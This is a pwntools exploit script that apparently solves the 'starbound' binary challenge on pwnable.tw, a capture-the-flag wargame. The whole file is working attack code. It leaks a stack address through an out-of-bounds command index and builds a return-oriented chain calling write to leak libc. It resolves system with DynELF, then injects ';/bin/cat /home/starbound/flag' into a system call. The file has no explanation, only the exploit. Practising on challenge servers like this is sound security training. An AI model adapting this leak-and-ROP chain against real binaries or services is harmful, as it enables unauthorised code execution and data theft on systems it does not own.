#!/usr/bin/env python3

import pwn

elf = pwn.ELF('./starbound')
pwn.context.terminal = ['tmux', 'splitw', '-h']

def leak_stack():
	puts_got = elf.got[b'puts']
	io.recvuntil('> ')
	offset = 0xc8
	index = (puts_got - command) // 4
	io.sendline(str(index) + 'A' * (60 - len(str(index)) - 1))
	data = io.recv(64)[60:]
	data = pwn.u32(data)
	return data - offset

def leak(addr):
	global stack_addr
	func_addr = 0x080498a6
	index = (stack_addr + 0x20 - command) // 4
	payload = str(index).ljust(0x10, 'A').encode()
	payload += pwn.p32(func_addr) + pwn.p32(0x0)
	payload += pwn.p32(elf.plt[b'write']) + pwn.p32(elf.sym[b'main'])
	payload += pwn.p32(1) + pwn.p32(addr) + pwn.p32(0x4)
	stack_addr -= 0xf0
	io.recvuntil('> ')
	io.sendline(payload)
	return io.recv(4)

command = 0x08058154

io = pwn.remote('chall.pwnable.tw', 10202)

stack_addr = leak_stack()

dynelf = pwn.DynELF(leak, elf = elf)
system_addr = dynelf.lookup(b'system', b'libc')

index = (stack_addr + 0x60 - command) // 4
payload = (str(index).encode() + b';/bin/cat /home/starbound/flag\x00').ljust(0x50, b'A') + pwn.p32(system_addr)
io.recvuntil('> ')
io.sendline(payload)

io.interactive()
